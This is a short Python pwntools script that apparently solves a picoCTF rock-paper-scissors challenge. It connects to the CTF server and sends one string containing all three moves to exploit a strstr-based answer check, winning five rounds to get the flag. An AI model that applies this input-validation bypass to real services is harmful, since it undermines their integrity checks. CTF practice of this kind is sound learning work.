from pwn import *

# the strstr function is used to find a substring in a string 
# so we can use a string that contains all the substrings of winning moves 'rockpaperscissors'


proc = connect('saturn.picoctf.net',49783)  # Replace with the actual binary name if different


win = "rockscissorspaper"

# Read the initial welcome messages
proc.recvuntil(b"Are you ready?")

# Play 5 games with always-win input
for x in range(5):
    proc.sendlineafter(b"Type '1' to play a game", b"1")
    proc.sendlineafter(b"selection (rock/paper/scissors):", win.encode())

# Receive the flag
output = proc.recvuntil(b"Play again?")
print(output.decode())

proc.interactive()
